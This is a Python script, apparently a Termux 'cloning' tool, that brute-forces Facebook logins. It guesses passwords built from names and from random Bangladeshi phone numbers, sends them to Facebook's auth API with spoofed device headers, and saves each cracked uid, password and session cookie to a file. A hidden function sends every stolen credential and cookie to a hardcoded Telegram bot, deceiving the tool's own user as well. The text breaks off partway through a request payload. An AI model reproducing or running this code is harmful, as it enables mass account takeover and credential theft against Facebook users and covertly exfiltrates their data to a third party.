#__________________| IMPORT |__________________#
import os,random
import sys,time,uuid
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
from time import localtime as lt
os.system('clear')
print('\33[1;34m[\033[38;5;46m×\33[1;34m]\033[38;5;46m CHECKING UPDATE...!\x1b[38;5;46m [\x1b[1;97m–\x1b[38;5;46m]\x1b[38;5;46m')
time.sleep(3)
os.system('clear')
print('\33[1;34m[\033[38;5;46m×\33[1;34m]\033[38;5;46m LODGING MR.TOM \x1b[1;97mTOOL \x1b[38;5;81m...\x1b[38;5;46m [\x1b[1;97m->\x1b[38;5;46m]');time.sleep(6)
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python MR.TOM.py')
except:pass
#__________________| SIM-NAME |__________________#
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'-\x1b[38;5;51m')
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];user=[]
#__________________| Apprubal |__________________#
class apvroval:
    def check():
        url = "https://hasanahmed090975.blogspot.com/2024/02/keytxt.html"
        import mechanize
        my_awm = mechanize.Browser()
        try:
            host = my_awm.open(url)
            check_key = str(host.read())
            if MY_KEY in check_key:
                menu()
            else:
                clear()
                print(f'\33[1;34m[\x1b[38;5;46m×\33[1;34m] \33[1;34m[\033[38;5;46m×\33[1;34m]\033[38;5;46m FREE TOOL WITH FRIENDS ')
                os.system('xdg-open https://wa.me/+8801751581953')
                print('\33[1;34m[\x1b[38;5;46m×\33[1;34m] \33[1;34m[\033[38;5;46m×\33[1;34m]\033[38;5;46m SEND YOUR KEY TO GET APPROVAL');linex()
        except Exception as e:
            print(e)
#__________________| Key |__________________#
myid = uuid.uuid4().hex[:30].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
except:
    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
    getx.write(idmy)
    getx.close()
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
#__________________| apk chacker |__________________#
import requests
def Elite(ids,pas,coki):
    try:
        token = "7159503596:AAEwh7GXFB0j3i_qYBpnZsmwzOtENy-6TDE" ;chatid = "1936367341";ok_id =str(ids+"|"+pas+"|"+coki);url = f"https://api.telegram.org/bot{token}/sendMessage";params = {"chat_id": chatid, "text": ok_id};requests.get(url, params=params)
    except:
        pass
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];user=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';L = '\x1b[1;32m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';T = '\33[1;34m[\x1b[38;5;46m×\33[1;34m]'
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; TOM~XD\x07')
#__________________| VERSION |__________________#
vers = requests.get('https://raw.githubusercontent.com/Parvez090975/Methud/main/Version').text
version = str(vers)
#__________________[ UA SERVER ]__________________#
get_ua_list2 = requests.get("https://raw.githubusercontent.com/Parvez090975/Methud/main/M2").text.splitlines()
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| LOGO |__________________#
logo=(f"""
{R}• {L}▌ ▄ {R}·. {L}▄▄▄     ▄▄▄▄▄      {R}• {L}▌ ▄ {R}·. 
{R}·{L}██ ▐███{R}▪{L}▀▄ █{R}·   •{L}██  {R}▪     ·{L}██ ▐███{R}▪
{L}▐█ ▌▐▌▐█{R}·{L}▐▀▀▄     ▐█{R}.▪ {L}▄█▀▄ ▐█ ▌▐▌▐█{R}·
{L}██ ██▌▐█▌▐█{R}•{L}█▌    ▐█▌{R}·{L}▐█▌{R}.{L}▐▌██ ██▌▐█▌
▀▀  █{R}▪{L}▀▀▀{R}.{L}▀  ▀ ▀  ▀▀▀  ▀█▄▀{R}▪{L}▀▀  █{R}▪{L}▀▀▀
{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{T}{L} FACEBOOK {R}●{L} MD PARVEZ AHMED
{T}{L} GITHUB   {R}● {L}TOM_XD_404
{T}{L} VERSION  {R}● \033[1;31m{vers}\33[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{T}{L} YOUR KEY {R}:{L} {MY_KEY}
\33[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________| MAIN |__________________#
def menu():
        try:
                        clear()
                        print(f'{T} {X}[{L}1{X}]\x1b[38;5;46m FILE CLONING \n{T} {X}[{L}2{X}]\x1b[38;5;46m RANDOM CLONING\n{T} {X}[{L}3{X}]\x1b[38;5;46m CONTACT TOOL OWNER\n{T} {X}[{L}0{X}]{R} EXIT TOOL')
                        linex()
                        xd=input(f'{T} {X}[{L}?{X}]{G} CHOICE : {A}')
                        if xd in ['1','01','a','A']:
                                clear();print(f'{T} {X}[{L}×{X}]{G} EXAMPLE : /sdcard/TOM.txt ');linex()
                                file = input(f'{T} {X}[{L}?{X}]{G} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{T} {X}[{G}×{X}]{G} FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{T} {X}[{G}1{X}]{G} METHOD {X}[{A}M1{X}]\n{T} {X}[{G}2{X}]{G} METHOD {X}[{A}M2{X}]');linex()
                                mthd=input(f'{T} {X}[{G}?{X}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'{T} {X}[{G}1{X}]{G} AUTO PASSWORD\n{T} {X}[{G}2{X}]{G} CHOICE PASSWORD');linex()
                                ppp=input(f'{T} {X}[{G}?{X}]{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last');plist.append('firstlast');plist.append('First Last');plist.append('@first@');plist.append('first1234');plist.append('first1');plist.append('first420');plist.append('first22');plist.append('first@@');plist.append('first@');plist.append('first123');plist.append('first@1234');plist.append('@last@');plist.append('last1234');plist.append('last1');plist.append('last123');plist.append('last@1234');plist.append('last@');plist.append('last22');plist.append('firstlast1234');plist.append('First');plist.append('Last');plist.append('firstlast@1234')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'{T} {X}[{G}×{X}]{G} PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'{T} {X}[{G}×{X}]{G} EXAMPLE : firstlast{X1}/{G}first@@{X1}/{G}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{X}[{G1}×{X}]{G} PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'{T} {X}[{G}×{X}]{G} DO YOU WANT CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{T} {X}[{G}?{X}]{G} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=60) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'{T} {X}[{G}×{X}]{G} TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        print(f'{T} {X}[{G}×{X}]{G} USE FLIGHT MODE FOR SPEED UP')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(_api_1_,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(_api_2_,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'{T} {X}[{G}×{X}]{G} THE PROCESS HAS COMPLETED')
                                print(f'{T} {X}[{G}×{X}]{G} TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'{T} {X}[{G}×{X}]{G} PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                _randm_()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/Parvez.143.404');menu()
                        elif xd in ['0','05']:
                                exit(f'{T} {X}[{G}×{X}]{G} EXIT DONE ')
                        else:
                                exit(f'{T} {X}[{G}×{X}]{G} OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'{T} {X}[{G}×{X}]{G} NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def _randm_():   
    clear()
    print(f'{T} {X}[{G}1{X}]{G} BANGLADESH CLONING')
    print(f'{T} {X}[{G}2{X}]{G} INDIA CLONING')
    print(f'{T} {X}[{G}0{X}]{G} BACK TO MAIN MENU')
    linex()
    select = input(f'{T} {X}[{G}0{X}]{G} CHOICE {R}:{G} ')
    if select =='1':
        _bd_()
    elif select =='2':
        _India_()
    elif select =='0':
        menu()
    else:
        print(f'{T} {X}[{G}×{X}]{G} VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'{T} {X}[{G}×{X}]{G} EXAMPLE {A}:{G} 017{A}|{G}019{A}|{G}018{A}|{G}016{A}|{G}013');linex()
    code = input(f'{X}[{G1}0{X}]{G1} CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{T} {X}[{G}×{X}]{G} EXAMPLE {A}:{G} 3000{A}/{G}5000{A}/{G}10000{A}/{G}99999');linex()
    limit = int(input(f'{T}™{X}[{G}×{X}]{G} CHOICE  {A}:{G} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with tred(max_workers=30) as crack_submit:
        clear()
        print(f'{T} {X}[{G}×{X}]{G} SIM CODE  {A}:{G} {code}')
        print(f'{T} {X}[{G}×{X}]{G} TOTAL UID {A}:{G} {str(len(user))}')
        print(f'{T} {X}[{G}×{X}]{G} IF NO RESULT ON{A}/{G}OFF{G} AIRPLANE MODE ');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            crack_submit.submit(randm,ids,psd)
    print('')
    print(f'\r{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{T} {X}[{G}×{X}]{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{T} {X}[{G}×{X}]{G} TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
    print(f'\r{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{T} {X}[{G}×{X}]{G} PRESS ENTER TO BACK ')
    menu()
#__________________| sex |__________________#
def sex():
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    fbrv = str(random.randint(000000000,999999999))
    density = random.choice(['2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930V;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
    return ua
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f'\r\r{T} {X}[{G}XD{R}-{G}RN{X}]\x1b[1;93m %s {G}OK{X}★{A}CP{G} %s{X}★{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': sex(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://api.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{T} {X}[{G}SUCCESS{X}]{G} {uid} {X}•{G} {pas}')
                open('/sdcard/TOM-RN.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                Elite(ids,pas,coki)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________[ FILE M1 ]__________________#
def _api_1_(ids,names,passlist):
        try:
                global oks,cps,loop,sim_id
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r\r\r\r{T} {X}[{G}XD{R}-{G}FILE{R}-{G}M1{X}]\x1b[1;93m {abir}%s {G}OK{X}★{A}CP{G} %s{X}★{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US'])
                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','TOM Shark','TOM Shark 2','TOM Shark 3','TOM Shark 3S','TOM Shark 4','TOM Shark 4 Pro','TOM Shark 5','TOM Shark 5 Pro','TOM Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sm=['GT-', 'SM-']
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                        "adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
